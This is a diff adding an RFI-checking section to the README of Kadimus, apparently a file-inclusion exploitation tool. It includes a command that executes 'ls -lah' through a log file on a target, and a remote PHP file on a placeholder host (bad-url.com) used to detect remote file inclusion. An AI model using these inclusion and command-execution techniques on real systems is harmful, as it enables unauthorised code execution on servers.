@@ -113,3 +113,18 @@ $ make
 ```
 ./kadimus -t localhost/?pg=/var/log/auth.log -X auth -c 'ls -lah'
 ```
+### Checking for RFI
+
+You can also check for RFI errors, just put the remote url on resource/common_files.txt
+and the regex to identify this, example:
+
+
+```php
+/* http://bad-url.com/shell.txt */
+<?php echo base64_decode("c2NvcnBpb24gc2F5IGdldCBvdmVyIGhlcmU="); ?>
+```
+
+in file:
+```
+http://bad-url.com/shell.txt?:scorpion say get over here
+```
